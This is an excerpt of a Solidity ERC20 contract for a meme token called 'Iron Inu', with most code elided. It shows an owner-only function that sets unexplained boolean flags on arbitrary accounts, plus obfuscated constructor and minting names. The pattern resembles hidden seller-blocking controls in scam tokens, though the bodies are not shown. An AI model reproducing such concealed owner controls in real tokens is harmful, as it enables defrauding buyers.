...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function IronOre(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _MineTheDog(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Iron is Context, ERC20 {
    constructor(
        ...
        uint256 house9
    ) ERC20(name, symbol, creator, house01, house2, house9) {
        _MineTheDog(owner, initialSupply, house6, house7);
    }
}

contract IronInu is ERC20Iron {
    constructor() ERC20Iron("Iron Inu", "IRONINU", false, true, 900, 25, msg.sender, 50000000 * 10 ** 18, msg.sender, 25) {
    }
}